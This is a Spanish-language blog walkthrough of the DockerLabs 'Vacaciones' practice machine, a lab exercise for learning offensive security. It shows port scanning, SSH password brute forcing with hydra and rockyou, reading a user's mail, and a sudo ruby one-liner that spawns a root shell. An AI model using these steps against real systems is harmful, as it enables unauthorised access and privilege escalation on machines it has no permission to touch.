---
layout: post
title: "Vacaciones"
date: 2024-06-29 12:20:23
category: sample
vm: dockerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Vacaciones </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Muy Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>

![img](/notas/public/img/dockerlabs/vacaciones/host.png){:.margin}

**1\.** Escaneo los puertos y servicios de la maquina.

`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/vacaciones/nmap.png){:.margin}

**2\.** En la web visualmente no tenemos nada, pero si vemos la fuente encontramos posibles usuarios.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/vacaciones/80.png){:.margin}
![img](/notas/public/img/dockerlabs/vacaciones/80code.png){:.margin}

**3\.** Haciendo fuerza bruta al ssh.

`echo -e "camilo\njuan" > users.txt`

`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

![img](/notas/public/img/dockerlabs/vacaciones/hydra.png){:.margin}

**4\.** Accedo por ssh con estas credenciales.

`ssh camilo@172.17.0.2`

![img](/notas/public/img/dockerlabs/vacaciones/sshcamilo.png){:.margin}

**5\.** Busco el dichoso correo que nos dejo juan.

`find / -name mail 2>/dev/null | xargs find`

`cat /var/mail/camilo/correo.txt`

![img](/notas/public/img/dockerlabs/vacaciones/find.png){:.margin}

**6\.** Migro al usuario juan.

`su juan`

![img](/notas/public/img/dockerlabs/vacaciones/sujuan.png){:.margin}

**7\.** Encuentro un binario que puedo ejecutarlo como root.

`sudo -l`

![img](/notas/public/img/dockerlabs/vacaciones/sudol.png){:.margin}

**8\.** Escalando privilegios, Busco indicaciones del binario en [gtfobins](https://gtfobins.github.io/gtfobins/ruby/#sudo).

`sudo ruby -e 'exec "/bin/bash"'`

![img](/notas/public/img/dockerlabs/vacaciones/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>